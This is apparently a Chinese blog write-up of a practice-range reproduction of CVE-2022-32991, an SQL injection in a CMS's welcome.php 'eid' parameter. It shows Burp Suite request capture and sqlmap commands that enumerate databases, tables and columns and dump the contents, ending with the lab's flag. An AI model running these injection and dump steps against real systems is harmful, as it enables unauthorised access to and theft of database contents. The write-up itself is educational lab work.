# CVE-2022-32991靶场复现

靶场环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698391168977-d9dd1ffd-b597-4c48-8983-b25a7594863a.png#averageHue=%23242b41&clientId=ua93c8982-2c16-4&from=paste&height=683&id=uefea2e23&originHeight=854&originWidth=1525&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156268&status=done&style=none&taskId=ud8992b20-9651-4320-99b2-fe74ea83465&title=&width=1220)
> 题目提示了该CMS的welcome.php中存在SQL注入攻击。

CVE官方给出的提示：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698391542348-6b3c5766-2e18-400f-9335-023601fa65a6.png#averageHue=%2388b563&clientId=ua93c8982-2c16-4&from=paste&height=711&id=u7b402201&originHeight=889&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=169157&status=done&style=none&taskId=u389696ca-e6bc-4bb8-8e8f-05434362234&title=&width=1517.6)
> welcome.php页面存在SQL注入，并且这个参数是eid

打开靶场环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698391792461-4dd75298-b543-4f01-b243-a47e645d58d8.png#averageHue=%23525251&clientId=ua93c8982-2c16-4&from=paste&height=753&id=uc2334ce5&originHeight=941&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=600876&status=done&style=none&taskId=uc8c707d0-8aa0-4bde-8fd0-237220af11e&title=&width=1528.8)
> 页面是一个登陆注册的界面

用户注册：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698391971723-d81cc462-32f8-4722-b408-ddc3529912b5.png#averageHue=%236c6c6b&clientId=ua93c8982-2c16-4&from=paste&height=747&id=uff52efea&originHeight=934&originWidth=1878&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=440516&status=done&style=none&taskId=uda5dfb8a-1518-4f59-ac9a-357409aacc3&title=&width=1502.4)
> 1
> 01@0.com
> 123456
> 123456
> 点击Register(注册）
> 注册成功

用户登录：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698392195911-d80521f1-144b-43d9-b394-7336c674b930.png#averageHue=%23616060&clientId=ua93c8982-2c16-4&from=paste&height=746&id=u3c32fe77&originHeight=932&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=482060&status=done&style=none&taskId=u2c707ec1-f9bc-4809-b271-2171190a7d3&title=&width=1522.4)
> 01@0.com
> 123456
> 点击Login(登录)

登陆成功：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698392458601-c07898a4-1fd7-4755-bf6d-fc6f43d16d6c.png#averageHue=%230b9164&clientId=ua93c8982-2c16-4&from=paste&height=838&id=ue2b21ac0&originHeight=1047&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68244&status=done&style=none&taskId=u96493203-f850-4e5d-87fe-77c5a595b06&title=&width=1536)
> 箭头所指方向存在welcome.php文件但是参数不是eid，而是p
> 下方有Start开始按钮，点点试试，看看有没有新的发现

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698392812414-f02d78f5-6fca-47a0-9f8e-50d46ead7db6.png#averageHue=%230b9164&clientId=ua93c8982-2c16-4&from=paste&height=851&id=ufead1465&originHeight=1064&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63744&status=done&style=none&taskId=u7c3b69cf-2fbb-4ec4-a8ea-451e91b1016&title=&width=1531.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698392864822-255d44d8-1412-453a-b1d6-5dc967c28d68.png#averageHue=%230b9164&clientId=ua93c8982-2c16-4&from=paste&height=849&id=ua201c533&originHeight=1061&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68108&status=done&style=none&taskId=u9ebb476d-1ffb-4d0f-9ede-789dbe6fdee&title=&width=1534.4)
> 存在了eid参数
> 由于没有注入窗口，所以想到了，火狐+burpsuite+sqlmap组合拷打

复制带有eid参数的页面网址，用火狐浏览器打开，进行burpsuite抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698393233588-914e8824-9f61-4493-9b21-5c59048195da.png#averageHue=%230c9064&clientId=ua93c8982-2c16-4&from=paste&height=727&id=u66c84e69&originHeight=909&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=621925&status=done&style=none&taskId=uc3d812fa-1194-406e-994d-5eceb60f042&title=&width=1328.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698393280173-a158f038-7ffd-4a37-9a15-7e0bf1804cee.png#averageHue=%23797351&clientId=ua93c8982-2c16-4&from=paste&height=719&id=u79c922d1&originHeight=899&originWidth=1599&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=472705&status=done&style=none&taskId=u34b74877-25d2-45bd-9070-d17114717e8&title=&width=1279.2)<br />创建一个txt文件，将数据包复制到这个txt文件里面<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698393383124-d84a3157-bc6a-4260-ae7e-52c5e2718a70.png#averageHue=%231c203a&clientId=ua93c8982-2c16-4&from=paste&height=717&id=u9bfb2fc8&originHeight=896&originWidth=1454&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=855653&status=done&style=none&taskId=ued2f68c3-80ee-46eb-96ca-fc8ab7726e3&title=&width=1163.2)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698393911003-d83c4de7-8c37-40ed-b785-af17a197b2c5.png#averageHue=%231b1d28&clientId=ua93c8982-2c16-4&from=paste&height=714&id=u99f72faf&originHeight=893&originWidth=1642&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=423140&status=done&style=none&taskId=uc85e1b54-92cc-46d2-b46c-c9201fcad9e&title=&width=1313.6)<br />注入前的准备工作，了解sqlmap的部分参数
> 1. -r 加载文件中的HTTP请求（本地保存的请求包txt文件）
> 2. -D 选择使用哪个数据库
> 3. -T 选择使用哪个表
> 4. -C 选择使用哪个列
> 5. --dbs 列出所有的数据库
> 6. --batch 自动选择yes
> 7. --tables 列出当前的表
> 8. --columns 列出当前的列
> 9. --dump 获取字段中的数据

**启动sqlmap加载flag.txt文件HTTP请求并列出其所有数据库**<br />**进入到桌面目录下（注意这是我的flag.txt文件保存的位置）**<br />**执行如下命令：**<br />`sqlmap -r flag.txt --dbs --batch`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698407128776-06b08a44-1d47-48db-af31-5e8d5543fe29.png#averageHue=%231c1e26&clientId=ua93c8982-2c16-4&from=paste&height=683&id=u528db8a1&originHeight=854&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=415792&status=done&style=none&taskId=u2ea07427-719f-4699-962a-9152cce1860&title=&width=1328.8)<br />**可以看到存在数据库ctf（注意执行命令后，加载可能会慢点，不必慌张。）**<br />**接下来列出数据库ctf里面的所有数据表**<br />**执行如下命令：**<br />`sqlmap -r flag.txt -D ctf --tables --batch`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698407428057-f78c2ce7-cfa9-4aee-ac67-5d3cddb0ba4d.png#averageHue=%231c1f26&clientId=ua93c8982-2c16-4&from=paste&height=692&id=u673d87b6&originHeight=865&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=433722&status=done&style=none&taskId=u0d06371d-ef0e-40bf-a800-c0621d72830&title=&width=1328.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698407504322-076b7257-5b11-4408-bf9e-2741ebed3620.png#averageHue=%231c1e26&clientId=ua93c8982-2c16-4&from=paste&height=685&id=u782cf460&originHeight=856&originWidth=1650&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=402839&status=done&style=none&taskId=u7f1d5903-b684-47aa-b69b-a213e38985b&title=&width=1320)<br />**可以看到数据库ctf里面存在数据表flag，猜测数据表flag里面存在flag（严谨一点）**<br />**接着爆数据表flag里面的字段**<br />**执行如下命令：**<br />`sqlmap -r flag.txt -D ctf -T flag --columns --batch`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698407773732-b8740606-49e4-471c-9c33-9fed9721804c.png#averageHue=%231c1e26&clientId=ua93c8982-2c16-4&from=paste&height=687&id=ua949a307&originHeight=859&originWidth=1632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=417358&status=done&style=none&taskId=u16e225ab-9f7f-4e22-b229-9b93128505c&title=&width=1305.6)<br />**数据表flag里面存在字段flag**<br />**最后爆flag字段里面的内容**<br />**执行如下命令：**<br />`sqlmap -r flag.txt -D ctf -T flag -C flag --dump --batch`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698407990838-6ce051b0-d835-41ac-a77f-26302c6c971c.png#averageHue=%231c1e26&clientId=ua93c8982-2c16-4&from=paste&height=680&id=udbd6f0a4&originHeight=850&originWidth=1648&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=417703&status=done&style=none&taskId=u9bc8b9f6-2293-43a7-800c-e733072ef37&title=&width=1318.4)<br />**得出flag：**<br />`flag{cdadbe80-6b13-4ce7-bd86-3ff050dd36d3}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134083293?spm=1001.2014.3001.5502


